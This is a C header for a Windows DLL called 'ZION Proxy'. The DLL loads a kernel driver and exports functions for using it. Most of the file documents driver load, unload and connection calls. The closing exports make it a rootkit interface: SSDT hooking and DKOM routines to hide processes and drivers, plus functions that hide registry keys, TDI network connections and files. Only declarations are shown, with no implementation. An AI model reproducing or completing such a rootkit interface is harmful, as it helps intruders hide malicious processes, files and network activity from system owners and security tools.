/*
 *      name: ZION Proxy Header
 *      type: USER RUNTIME
 *
 *      Org Author: Shikai Chen
 *		Modified: Liang Chen (add a ZIONRESULT)
 *      Version : 0.1
 */

#pragma once



#ifndef ZION_PROXY_DLL_EXPORTS
#pragma comment(lib,"zion_proxy_dll.lib")
#endif

#ifdef ZION_PROXY_DLL_EXPORTS
#define ZION_PROXY_DLL_API __declspec(dllexport)
#else
#define ZION_PROXY_DLL_API __declspec(dllimport)
#endif




#ifdef __cplusplus
#define STD_EXPORT(_TYPE_)  extern "C" ZION_PROXY_DLL_API _TYPE_
#else
#define STD_EXPORT(_TYPE_)  ZION_PROXY_DLL_API _TYPE_
#endif


typedef unsigned int ZIONRESULT;

//RESULT BASIC TYPES
#define ZION_OK                 0x00000000u
#define ZION_UNKNOWN            0x40000000u
#define ZION_ERROR              0x80000000u

//RESULT DETAILED TYPES
#define ZION_CONNECTFAILED      0x80000001u
#define ZION_SERVER_LOADERROR   0x80000002u
#define ZION_SERVER_NOTLOAD     0x80000003u
#define ZION_DISCONNECTFAILED   0x80000004u
#define ZION_CANNOT_UNLOAD      0x80000005u

//ZION OPERATION FLAG TYPES
#define ZION_OPERATION_STD   0
#define ZION_OPERATION_FORCE 1

//added by Liang Chen
#define ZION_MEMORY_ALLOC_FAIL 0x81000001u

#define ZION_FAILED(_ans_)  \
    ((_ans_) & ZION_ERROR)

#define ZION_SUCCEED(_ans_)  \
    ((_ans_)==ZION_OK)

STD_EXPORT(BOOL) zion_isServerLoaded(void);
//Test whether the zion server device object handle exists:
//if such handle exists, open it and return TRUE
//if such handle does not exist or cannot be opened, return FALSE

//NOTICE: 
// [1] Client should call this funcion BEFORE any other ZION OPERATIONS
// [2] This function will *automantically* open a Sever Devive Handle when
//     the Server has already been loaded.
//     Client should *explicit* invoke the zion_proxy_release to release such handle

STD_EXPORT(VOID) zion_proxy_release(void);
//Release the Proxy's resources



STD_EXPORT(ZIONRESULT) zion_connectServer(LPCWSTR strHelloMsg, DWORD dwFlag);
//Try to establish a connection between the Server and current client
//Any client should make a connection to the server FIRST

//NOTICE: To connect to the server, one should first load it 


STD_EXPORT(ZIONRESULT) zion_disconnectServer(DWORD dwFlag);
//Disconnect the connection between the Server and current client

STD_EXPORT(ZIONRESULT) zion_isConnected(void);
//Indicate whether aconnection has been established




STD_EXPORT(ZIONRESULT) zion_loadServer(DWORD dwFlag);
//Load the Server device driver into the kernel
//If specify the ZION_OPERATION_FORCE flag, this function will first stop 
//currently running server, unload it, and then reload it again.

//NOTICE(ZION_OPERATION_FORCE specified): this function will fail when there exists *ANY* 
//connection between the Server and some Clients



STD_EXPORT(ZIONRESULT) zion_unloadServer(LPCWSTR strReason, DWORD dwFlag);
//Stop and Unload the server device
//strReason will stored in server log files.
//Specify the strReason  to NULL for normal operations

//NOTICE: this function will fail when there exists *ANY* connection between the
//Server and some Clients



STD_EXPORT(ZIONRESULT) SSDT_HOOK_HIDE_ZIONFILE();
STD_EXPORT(ZIONRESULT) SSDT_HOOK_HIDE_PROCESS(DWORD pid);
STD_EXPORT(ZIONRESULT) DKOM_HideProcessByPid(DWORD pid);
STD_EXPORT(ZIONRESULT) DKOM_HideDriverByName(WCHAR *DriverFileName);
STD_EXPORT(ZIONRESULT) Hive_HideRegistryByPath(WCHAR *RegKeyPath);
STD_EXPORT(ZIONRESULT) TDI_ConnectionHide(DWORD Type,DWORD SrcAddr,USHORT SrcPort,DWORD DstAddr,USHORT DstPort);
STD_EXPORT(ZIONRESULT) Filter_Hide_File(WCHAR *FileName, DWORD type);